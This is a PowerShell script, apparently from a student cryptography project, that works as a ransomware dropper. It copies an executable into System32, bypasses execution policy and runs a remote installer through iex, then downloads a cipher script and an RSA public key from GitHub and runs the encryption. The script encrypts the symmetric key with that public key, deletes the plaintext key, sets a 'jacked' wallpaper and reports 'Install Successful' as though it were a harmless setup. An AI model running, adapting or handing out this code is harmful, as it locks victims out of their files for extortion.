Invoke-Command -ScriptBlock {
    Copy-Item "$Env:userprofile\Escritorio\Office.exe" -Destination $Env:windir\System32
    Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
    if($?){
        choco install python3 -y
	choco install openssl -y
	choco install pip -y
	$urlsc = 'https://raw.githubusercontent.com/El3ctrix/Proyecto-Cripto-CERT/main/Cipher.py'
	$urlpk = 'https://raw.githubusercontent.com/El3ctrix/Proyecto-Cripto-CERT/main/public.pem'
	$urlimg = 'https://github.com/El3ctrix/Proyecto-Cripto-CERT/raw/main/wallpaper.jpg'
    Invoke-WebRequest -Uri $urlsc -OutFile $Env:userprofile\Escritorio\script.py
	Invoke-WebRequest -Uri $urlpk -OutFile $Env:userprofile\Escritorio\public.pem
	Invoke-WebRequest -Uri $urlimg -OutFile $Env:userprofile\Escritorio\jacked.jpg
	Function Set-WallPaper($Image) {
    	Add-Type -TypeDefinition @" 
    	using System; 
    	using System.Runtime.InteropServices;
    
    	public class Params
    	{ 
        	[DllImport("User32.dll",CharSet=CharSet.Unicode)] 
        	public static extern int SystemParametersInfo (Int32 uAction, 
                                                    		Int32 uParam, 
                                                    		String lpvParam, 
                                                    		Int32 fuWinIni);
    	}
"@
        	$SPI_SETDESKWALLPAPER = 0x0014
        	$UpdateIniFile = 0x01
        	$SendChangeEvent = 0x02 
        	$fWinIni = $UpdateIniFile -bor $SendChangeEvent 
        	$ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
    
    	}
	$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
	pip install pycryptodome
	pip install pbkdf2
	& python.exe script.py
	& openssl rsautl -encrypt -pubin -inkey $Env:userprofile\Escritorio\public.pem -in $Env:userprofile\Escritorio\key.bin -out $Env:userprofile\Escritorio\keyenc.enc
	Remove-Item $Env:userprofile\Escritorio\key.bin
	Set-WallPaper -Image "$Env:userprofile\Escritorio\jacked.jpg"
	Write-Host 'Install Successful'
    } else {
        Write-Host 'Install Failed'
    }
}